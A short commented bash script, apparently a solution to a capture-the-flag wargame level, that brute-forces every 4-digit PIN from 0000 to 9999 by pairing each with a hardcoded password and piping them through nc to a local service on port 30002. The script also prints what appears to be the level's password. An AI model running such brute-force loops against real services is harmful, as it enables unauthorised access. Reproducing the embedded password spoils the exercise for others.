#!/bin/bash
    
# Now what we really need is automating the bruteforce attack so we need the fore loop to go in each pass and PIN 


for NA in {0000..9999}  # we try to go in each pin so from 0000 to 9999 will try them all
do
        echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $NA >> justfile.txt      # put all the pass and the PIN in one file 
done # end of for 

         cat justfile.txt | nc localhost 30002 > counter.txt  # we take the file from the loop and give it to the nc and then store all the result in counter.txt
